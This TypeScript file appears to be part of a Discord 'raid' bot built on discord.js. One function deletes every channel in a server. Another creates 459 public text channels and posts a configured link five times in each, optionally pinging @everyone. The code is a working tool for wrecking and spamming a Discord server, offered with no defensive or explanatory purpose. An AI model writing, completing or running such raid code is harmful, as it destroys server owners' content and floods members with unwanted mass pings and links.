import {
  PermissionFlagsBits,
  ChannelType,
  Guild,
  type TextChannel,
} from "discord.js";
import { RaidOptions } from "../types/interfaces";

export const deleteChannels = async (guild: Guild) => {
  guild.channels.cache.forEach((c: any) => {
    c.delete();
  });
};

const sendMessages = async (
  channel: TextChannel,
  raidData: RaidOptions,
  ms?: number
) => {
  const message = raidData.ping ? `@everyone ${raidData.link}` : raidData.link;
  
  for (let i = 0; i < 5; i++) {
    await channel.send(message);
  }
};

export const createChannels = async (guild: Guild, raidData: RaidOptions) => {
  if (!guild) return;

  const promises = [];

  for (let i = 0; i < 459; i++) {
    const p = (async () => {
      try {
        const channel = await guild.channels.create({
          name: raidData.name,
          topic: raidData.link,
          type: ChannelType.GuildText,
          permissionOverwrites: [
            {
              id: guild.roles.everyone.id,
              allow: [PermissionFlagsBits.ViewChannel],
            },
          ],
        });

        if (channel.isTextBased() && !channel.isVoiceBased()) {
          await sendMessages(channel as TextChannel, raidData);
        }
      } catch (error) {
        console.error(`Error en canal #${i + 1}:`, error);
      }
    })();

    promises.push(p);
  }

  await Promise.all(promises);
};
